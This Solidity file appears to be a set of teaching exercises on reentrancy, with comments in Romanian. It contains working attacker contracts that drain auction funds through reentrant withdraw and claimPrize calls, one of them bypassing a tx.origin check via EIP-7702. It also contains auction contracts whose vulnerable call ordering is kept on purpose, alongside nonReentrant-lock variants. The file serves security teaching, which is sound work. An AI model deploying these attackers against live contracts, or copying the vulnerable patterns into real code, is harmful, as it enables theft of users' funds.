// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {IAuction} from "./Auction.sol";

// Ex 3.1 - Attacker cu conditia corectata: reintra doar daca licitatia mai are cat o oferta intreaga
contract AttackerMax {
    IAuction auction;

    constructor(address auctionAddress) {
        auction = IAuction(auctionAddress);
    }

    function bid() external payable {
        (bool success,) = address(auction).call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(success);
    }

    function attack() external payable {
        (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
        require(success, "Attack failed");
    }

    fallback() external payable {
        if (msg.value > 0) {
            uint256 bidInfo = auction.bidInfo(address(this));
            // inainte: balance >= bidInfo / 5  -> reintra si cand nu mai sunt bani pentru un refund intreg
            if (address(auction).balance >= bidInfo) {
                (bool success,) = address(auction).call(abi.encodeWithSignature("withdraw()"));
                require(success);
            }
        }
    }
}

interface IPrizeAuction {
    function highestBid() external view returns (uint256);
}

// Ex 3.2 - castiga licitatia si reintra in claimPrize
contract PrizeAttacker {
    address auction;

    constructor(address auctionAddress) {
        auction = auctionAddress;
    }

    function bid() external payable {
        (bool ok,) = auction.call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(ok);
    }

    function attack() external {
        (bool ok,) = auction.call(abi.encodeWithSignature("claimPrize()"));
        require(ok, "Attack failed");
    }

    receive() external payable {
        // highestBid nu a fost pus pe 0 inca (in VulnerableAuction), deci pot cere premiul din nou
        uint256 prize = IPrizeAuction(auction).highestBid();
        if (prize > 0 && auction.balance >= prize) {
            (bool ok,) = auction.call(abi.encodeWithSignature("claimPrize()"));
            require(ok);
        }
    }
}

// Ex 3.3 - VulnerableAuction cu ordinea gresita PASTRATA, dar cu lock nonReentrant (transient)
contract GuardedAuction {
    mapping(address => uint256) public bids;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    bool transient locked;          // transient storage (EIP-1153), se sterge la finalul tranzactiei

    error ReentrantCall();

    event Withdrawal(address indexed bidder, uint256 amount);

    modifier nonReentrant() {
        if (locked) revert ReentrantCall();
        locked = true;
        _;
        locked = false;
    }

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");
        bids[msg.sender] += msg.value;
        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        require(highestBidder != address(0), "No bids placed");
        auctionEnded = true;
    }

    function withdraw() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");
        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");

        (bool success,) = msg.sender.call{value: refundAmount}("");
        bids[msg.sender] = 0;
        require(success, "Withdrawal failed");
        emit Withdrawal(msg.sender, refundAmount);
    }

    function claimPrize() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender == highestBidder, "Only winner can claim");
        require(highestBid > 0, "Already claimed");
        uint256 prizeAmount = highestBid;

        (bool success,) = msg.sender.call{value: prizeAmount}("");
        highestBid = 0;
        require(success, "Prize claim failed");
    }

    function bidInfo(address sender) external view returns (uint256) {
        return bids[sender];
    }
}

// Ex 3.3 - la fel, dar lock-ul e o variabila de storage obisnuita (pentru comparatia de gas)
contract GuardedAuctionStorage {
    mapping(address => uint256) public bids;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    bool locked;                    // storage normal

    error ReentrantCall();

    event Withdrawal(address indexed bidder, uint256 amount);

    modifier nonReentrant() {
        if (locked) revert ReentrantCall();
        locked = true;
        _;
        locked = false;
    }

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");
        bids[msg.sender] += msg.value;
        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        require(highestBidder != address(0), "No bids placed");
        auctionEnded = true;
    }

    function withdraw() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");
        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");

        (bool success,) = msg.sender.call{value: refundAmount}("");
        bids[msg.sender] = 0;
        require(success, "Withdrawal failed");
        emit Withdrawal(msg.sender, refundAmount);
    }

    function claimPrize() external nonReentrant {
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender == highestBidder, "Only winner can claim");
        require(highestBid > 0, "Already claimed");
        uint256 prizeAmount = highestBid;

        (bool success,) = msg.sender.call{value: prizeAmount}("");
        highestBid = 0;
        require(success, "Prize claim failed");
    }

    function bidInfo(address sender) external view returns (uint256) {
        return bids[sender];
    }
}

// Ex 3.3 - din withdraw incearca sa intre in claimPrize (alta functie) si salveaza eroarea primita
contract CrossAttacker {
    address auction;
    bytes public lastError;

    constructor(address auctionAddress) {
        auction = auctionAddress;
    }

    function bid() external payable {
        (bool ok,) = auction.call{value: msg.value}(abi.encodeWithSignature("placeBid()"));
        require(ok);
    }

    function attack() external {
        (bool ok,) = auction.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "Attack failed");
    }

    receive() external payable {
        (, bytes memory err) = auction.call(abi.encodeWithSignature("claimPrize()"));
        lastError = err;
    }
}

// Ex 3.4 - VulnerableAuction cu require(tx.origin == msg.sender) in withdraw
contract OriginCheckAuction {
    mapping(address => uint256) public bids;
    address public highestBidder;
    uint256 public highestBid;
    bool public auctionEnded;

    function placeBid() external payable {
        require(!auctionEnded, "Auction already ended");
        require(msg.value > 0, "Bid must be greater than 0");
        bids[msg.sender] += msg.value;
        if (bids[msg.sender] > highestBid) {
            highestBidder = msg.sender;
            highestBid = bids[msg.sender];
        }
    }

    function endAuction() external {
        require(!auctionEnded, "Auction already ended");
        auctionEnded = true;
    }

    function withdraw() external {
        require(tx.origin == msg.sender, "Only EOAs");
        require(auctionEnded, "Auction not ended yet");
        require(msg.sender != highestBidder, "Winner cannot withdraw");
        uint256 refundAmount = bids[msg.sender];
        require(refundAmount > 0, "No funds to withdraw");

        (bool success,) = msg.sender.call{value: refundAmount}("");
        bids[msg.sender] = 0;
        require(success, "Withdrawal failed");
    }

    function bidInfo(address sender) external view returns (uint256) {
        return bids[sender];
    }
}

// Ex 3.4 - cod pe care Mallory il "ataseaza" contului ei EOA cu EIP-7702
// codul ruleaza la adresa lui Mallory, deci msg.sender == tx.origin == Mallory si la reintrare
contract DelegatedAttacker {
    address immutable auction;

    constructor(address auctionAddress) {
        auction = auctionAddress;
    }

    function attack() external {
        (bool ok,) = auction.call(abi.encodeWithSignature("withdraw()"));
        require(ok, "Attack failed");
    }

    receive() external payable {
        uint256 myBid = IAuction(auction).bidInfo(address(this));
        if (auction.balance >= myBid) {
            (bool ok,) = auction.call(abi.encodeWithSignature("withdraw()"));
            require(ok);
        }
    }
}
